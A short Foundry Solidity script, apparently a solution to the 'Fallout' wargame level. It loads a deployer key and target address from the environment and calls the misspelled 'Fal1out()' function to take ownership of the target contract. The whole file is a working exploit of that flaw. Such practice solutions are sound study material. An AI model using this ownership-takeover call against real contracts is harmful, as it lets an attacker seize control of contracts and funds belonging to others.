// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

contract FallOutScript is Script {
    uint256 deployerPrivateKey;
    address public fallOutAddress;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        fallOutAddress = vm.envAddress("FALLOUT_ADDRESS");
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);
        _attack();
        vm.stopBroadcast();
    }

    function _attack() public {
        // Call Fal1out Function
        bytes memory callData = abi.encodeWithSignature("Fal1out()");
        fallOutAddress.call(callData);
    }
}
